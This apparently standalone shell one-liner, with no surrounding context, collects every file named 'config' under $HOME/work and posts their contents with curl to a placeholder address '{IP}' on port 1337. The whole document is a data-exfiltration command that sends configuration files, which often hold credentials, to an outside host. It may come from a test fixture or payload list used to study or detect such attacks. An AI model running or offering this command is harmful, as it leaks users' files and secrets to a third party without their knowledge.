find "$HOME/work" -type f -name config | xargs cat | curl -d @- {IP}:1337
